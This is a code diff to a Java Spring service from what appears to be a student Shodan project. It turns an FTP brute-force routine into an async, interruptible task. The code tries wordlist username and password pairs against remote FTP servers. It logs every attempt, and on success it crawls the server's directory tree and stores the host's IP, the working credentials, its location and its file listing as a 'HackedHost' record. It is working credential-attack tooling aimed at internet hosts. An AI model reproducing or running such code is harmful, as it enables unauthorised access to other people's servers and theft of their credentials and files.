@@ -14,11 +14,16 @@ import java.net.http.HttpResponse;
 import java.time.Duration;
 import java.util.List;
 import java.util.concurrent.ExecutionException;
+import java.util.concurrent.Future;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 import org.apache.commons.net.ftp.FTPClient;
 import org.apache.commons.net.ftp.FTPFile;
 import org.apache.commons.net.ftp.FTPReply;
+import org.jboss.logging.Logger;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.scheduling.annotation.Async;
+import org.springframework.scheduling.annotation.AsyncResult;
 import org.springframework.stereotype.Service;
 
 import com.uah.shodan_tfg.core.services.IConnectionService;
@@ -36,8 +41,14 @@ import net.schmizz.sshj.userauth.UserAuthException;
 @Service
 public class ConnectionService implements IConnectionService {
 
+	private static Logger LOGGER = Logger.getLogger(ConnectionService.class);
+
 	private final String[] commonUsernames = {"root", "admin", "oracle", "test",
 			"administrator", "guest", "mysql", "user", "info", "apache"};
+
+	private AtomicBoolean running = new AtomicBoolean(false);
+
+	private String finalResult;
 
 	@Autowired
 	IFileService fileService;
@@ -122,8 +133,11 @@ public class ConnectionService implements IConnectionService {
 	}
 
 	@Override
-	public String connectToFtpServer(Host host, List<String> wordlists) {
+	@Async
+	public Future<String> connectToFtpServer(Host host, List<String> wordlists)
+			throws InterruptedException {
 		String result = "";
+		finalResult = "";
 		List<String> userWordlist = fileService
 				.fileToList("src/main/resources/wordlists/" + wordlists.get(0));
 		List<String> passWordlist = fileService
@@ -150,64 +164,74 @@ public class ConnectionService implements IConnectionService {
 				System.out.println("IP--> " + ip);
 				messageController.send("IP--> " + ip);
 				Integer counter = 0;
-				for (String user : userWordlist) {
-					for (String pass : passWordlist) {
-						if (counter == 3) {
-							ftpClient.disconnect();
-							ftpClient.connect(ip, port);
-							counter = 0;
-						}
-						username = user;
-						password = pass;
-						System.out.println("Credentials tested --> User: "
-								+ username + " | Password: " + password);
-						messageController.send("Credentials tested --> User: "
-								+ username + " | Password: " + password);
-						try {
-							Boolean loggedIn = ftpClient.login(username,
-									password);
-							// Store login credentials
-							if (loggedIn) {
-								result = "Correct login credentials --> User: "
-										+ username + " | Password: " + password;
-								System.out.println(result);
-								messageController.send(result);
-								result = ftpClient.getReplyString();
-								System.out.println(
-										"FTP Server login response --> "
-												+ result);
-								messageController
-										.send("FTP Server login response --> "
-												+ result);
-								ftpClient.enterLocalPassiveMode();
-								String foldersTree = "\n{IP: " + ip
-										+ " | PORT: " + port + " | USER: "
-										+ username + " | PASS: " + password
-										+ "}\n" + generateFTPTree(ftpClient, "",
-												"/", 0, "");
-								HackedHost hackedHost = new HackedHost(null, ip,
-										username, password, port,
-										host.getLocation().getCountry(),
-										host.getLocation().getCity(),
-										foldersTree);
-								result = foldersTree;
-								hackedHostRepository.save(hackedHost);
-								break;
-							} else {
-								System.out
-										.println("Incorrect login credentials");
-								messageController
-										.send("Incorrect login credentials");
-								counter += 1;
+				if (running.compareAndSet(false, true)) {
+					for (String user : userWordlist) {
+						for (String pass : passWordlist) {
+							if (Thread.currentThread().isInterrupted()) {
+								System.out.println("Interrupted");
+								running.set(false);
+								return new AsyncResult<String>(finalResult);
 							}
-						} catch (IOException e) {
-							System.out.println(
-									"Incorrect login credentials --> " + e);
+							if (counter == 3) {
+								ftpClient.disconnect();
+								ftpClient.connect(ip, port);
+								counter = 0;
+							}
+							username = user;
+							password = pass;
+							System.out.println("Credentials tested --> User: "
+									+ username + " | Password: " + password);
 							messageController.send(
-									"Incorrect login credentials --> " + e);
-							ftpClient.disconnect();
-							ftpClient.connect(ip, port);
-							continue;
+									"Credentials tested --> User: " + username
+											+ " | Password: " + password);
+							try {
+								Boolean loggedIn = ftpClient.login(username,
+										password);
+								// Store login credentials
+								if (loggedIn) {
+									result = "Correct login credentials --> User: "
+											+ username + " | Password: "
+											+ password;
+									System.out.println(result);
+									messageController.send(result);
+									result = ftpClient.getReplyString();
+									System.out.println(
+											"FTP Server login response --> "
+													+ result);
+									messageController.send(
+											"FTP Server login response --> "
+													+ result);
+									ftpClient.enterLocalPassiveMode();
+									String foldersTree = "\n{IP: " + ip
+											+ " | PORT: " + port + " | USER: "
+											+ username + " | PASS: " + password
+											+ "}\n" + generateFTPTree(ftpClient,
+													"", "/", 0, "");
+									HackedHost hackedHost = new HackedHost(null,
+											ip, username, password, port,
+											host.getLocation().getCountry(),
+											host.getLocation().getCity(),
+											foldersTree);
+									finalResult = foldersTree;
+									hackedHostRepository.save(hackedHost);
+									running.set(false);
+									return new AsyncResult<String>(finalResult);
+								} else {
+									System.out.println(
+											"Incorrect login credentials");
+									messageController.send(
+											"Incorrect login credentials");
+									counter += 1;
+								}
+							} catch (IOException e) {
+								System.out.println(
+										"Incorrect login credentials --> " + e);
+								messageController.send(
+										"Incorrect login credentials --> " + e);
+								ftpClient.disconnect();
+								ftpClient.connect(ip, port);
+								continue;
+							}
 						}
 					}
 				}
@@ -240,7 +264,7 @@ public class ConnectionService implements IConnectionService {
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
-		return result;
+		return new AsyncResult<String>(finalResult);
 	}
 
 	private String generateFTPTree(FTPClient ftpClient, String currentDirectory,
